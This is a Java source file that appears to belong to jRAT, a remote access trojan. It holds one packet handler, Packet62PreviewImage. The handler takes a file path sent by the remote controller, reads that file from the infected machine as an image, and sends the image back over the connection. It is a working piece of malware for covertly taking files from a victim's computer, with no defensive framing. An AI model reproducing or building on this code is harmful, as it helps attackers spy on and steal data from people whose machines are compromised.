package jrat.module.fs.packets;

import jrat.client.Connection;
import jrat.client.packets.incoming.IncomingPacket;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.File;

public class Packet62PreviewImage implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String file = con.readLine();

		BufferedImage image = ImageIO.read(new File(file));

		con.addToSendQueue(new Packet43PreviewImage(file, image));
	}

}
